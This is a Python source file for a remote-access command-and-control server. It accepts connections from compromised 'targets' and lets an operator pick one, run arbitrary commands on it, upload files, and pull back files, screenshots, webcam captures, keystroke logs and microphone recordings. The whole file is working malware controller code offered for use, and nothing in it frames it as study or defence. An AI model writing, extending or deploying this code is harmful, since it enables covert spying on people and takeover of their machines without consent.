import socket
import time
import struct
import threading


clients = {} 
clients_lock = threading.Lock()

def recvall(sock, size):
    data = b""
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_file(sock, path):
    with open(path, "rb") as f:
        data = f.read()

    size = len(data)

    sock.sendall(struct.pack("!Q", size))
    sock.sendall(data)

def accept_clients(server_socket):
    while True:
        conn, addr = server_socket.accept()

        try:
            client_id = conn.recv(1024).decode().strip()
        except:
            conn.close()
            continue

        with clients_lock:
            if client_id in clients:
                print(f"[~] target {client_id} reconnected")
                clients[client_id]["conn"] = conn
                clients[client_id]["addr"] = addr
            else:
                print(f"[+] New target {client_id}")
                clients[client_id] = {
                    "conn": conn,
                    "addr": addr,
                    "active": False
                }

def cleanup_dead_clients():
    while True:
        with clients_lock:
            for cid in list(clients.keys()):
                c = clients[cid]
                if c["active"]:
                    continue
                try:
                    c["conn"].send(b'')
                except:
                    print(f"[-] Removing dead target {cid}")
                    c["conn"].close()
                    del clients[cid]
        time.sleep(5)

def list_connections():
    with clients_lock:
        for i, cid in enumerate(clients.keys()):
            c = clients[cid]
            ip, port = c["addr"]
            state = "ACTIVE" if c["active"] else "IDLE"
            print(f"{i} -> {cid[:8]} | {ip}:{port} | {state}")
            
def select_connection():
    list_connections()
    try:
        idx = int(input("Select client index: "))
    except:
        return

    with clients_lock:
        if idx < 0 or idx >= len(clients):
            return
        client_id = list(clients.keys())[idx]

    handle_client(client_id)

def handle_client(client_id):
	client_socket = clients[client_id]["conn"]
	addr = clients[client_id]["addr"]
	clients[client_id]["active"] = True
	print("C2 Server is Running...")
	print(f"[*] handling target {addr[0]}:{addr[1]}")
	while True:
		try:
			command = input("C2> Enter a Command: ")
			if command.lower() == 'exit':
				break
			if command.startswith('upload '):
				local_path = command.split(' ')[1]
				client_socket.send(command.encode())
				send_file(client_socket,local_path)
				print(client_socket.recv(1024).decode())
				continue

			client_socket.send(command.encode())
			
			
			
			if  command.startswith(('download', 'webcam', 'screenshot','getmicrecord', 'getkeylogger')):
				try:
					size = struct.unpack("!Q", recvall(client_socket, 8))[0]
					encoded_data = recvall(client_socket, size)
				except Exception :
					print("Error: Incorrect Using")
					continue
				if command == 'screenshot':
					filename = f"screenshot{int(time.time())}.png"
				elif command == 'webcam':
					filename = f"webcam{int(time.time())}.png"
				elif command == 'getkeylogger':
					filename = f"keylogg{int(time.time())}.txt"
				elif command == 'getmicrecord':
					filename = f"microphone{int(time.time())}.wav"
				else:
					filename = command[9:]
				try:
					with open(filename, 'wb') as f:
						f.write(encoded_data)
					print(f"File {filename} downloaded successfully.")
					continue
				except Exception as e:
					print(f"[-] Failed to save file: {e}")
					continue
			else : 
				output = client_socket.recv(1024).decode()
				print(output)
			#keylogg wela ymchi !
				
		except Exception as e:
			print(f"An error occurred: {e}")
			break


def menu():
    while True:
        print("\n--- C2 Server Menu ---")
        print("1. List Connections")
        print("2. Select Connection")
        print("3. Exit")
        choice = input("Enter your choice: ")
        if choice == '1':
            list_connections()
        elif choice == '2':
              select_connection()
        elif choice == '3':
                print("Exiting C2 Server.")
                break
        else:
            print("Invalid choice. Please try again.")
		

def start_server():
	serverIP = "0.0.0.0"
	serverPort = 4444

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((serverIP, serverPort))
	s.listen(5)
	print(f"[*] Listening on {serverIP}:{serverPort}")
	print("--------------------------------------------------")
	print("enter any command to send to the client")
	print("type 'upload <path on server> <path on client/filename>' to upload file to client machine")
	print("type 'download <path>' to download file from client machine")
	print("type 'screenshot' to capture screenshot from client machine")
	print("type 'webcam' to capture webcam image from client machine")
	print("type 'keylogger' to start keylogger on client machine")
	print("type 'getkeylogger' to get keystrokes logged from client machine")
	print("type 'mic' to start recording audio from client machine")
	print("type 'getmicrecord' to get audio recorded from client machine")
	print("type 'exit' to terminate the connection")    
	threading.Thread(target=accept_clients, args=(s,), daemon=True).start()
	threading.Thread(target=cleanup_dead_clients, daemon=True).start()
	menu()


if __name__ == "__main__":
	start_server()
